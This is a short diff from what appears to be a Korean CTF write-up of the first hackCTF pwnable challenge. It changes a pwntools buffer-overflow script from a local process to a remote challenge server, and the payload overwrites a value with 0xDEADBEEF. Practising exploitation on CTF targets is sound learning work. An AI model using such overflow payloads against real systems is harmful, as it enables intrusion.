@@ -57,7 +57,7 @@ hackCTF pwnable 첫번째 문제
   #!/usr/bin/python
   from pwn import *
 
-  p = process('./bof_basic')
+  p = remote('ctf.j0n9hyun.xyz', 3000)
 
   payload = "A"*(0x2c-0x4)+p32(0xDEADBEEF)
 
